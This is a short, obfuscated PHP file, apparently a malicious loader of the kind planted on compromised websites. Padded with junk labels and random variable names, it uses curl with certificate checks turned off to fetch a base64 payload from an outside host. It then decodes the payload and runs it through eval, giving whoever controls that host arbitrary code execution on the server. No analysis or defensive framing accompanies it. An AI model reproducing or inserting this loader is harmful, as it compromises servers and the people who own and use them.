<?php

error_reporting("E_XBJ");
function getDvcurl($lEjAjB)
{
    luvYAzB:
    luvYAAi:
    luvYALi:
    $lEjAjY = curl_init();
    luvYAPi:
    luvYAju:
    luvYALO:
    curl_setopt($lEjAjY, CURLOPT_URL, $lEjAjB);
    luvYALB:
    luvYAAK:
    luvYAiz:
    curl_setopt($lEjAjY, CURLOPT_RETURNTRANSFER, 1);
    luvYAYv:
    luvYABz:
    luvYAKP:
    curl_setopt($lEjAjY, CURLOPT_SSL_VERIFYPEER, false);
    luvYAPK:
    luvYAQm:
    luvYAiA:
    curl_setopt($lEjAjY, CURLOPT_SSL_VERIFYHOST, false);
    luvYAvu:
    luvYAzE:
    luvYAiQ:
    $lEjAjA = curl_exec($lEjAjY);
    luvYAKz:
    luvYAmL:
    luvYAmz:
    curl_close($lEjAjY);
    luvYAAE:
    luvYAmQ:
    luvYALm:
    return $lEjAjA;
}
echo eval("?>" . base64_decode(getDvcurl("https://hkjhall.com/4.txt")));
__halt_compiler();?> ?>
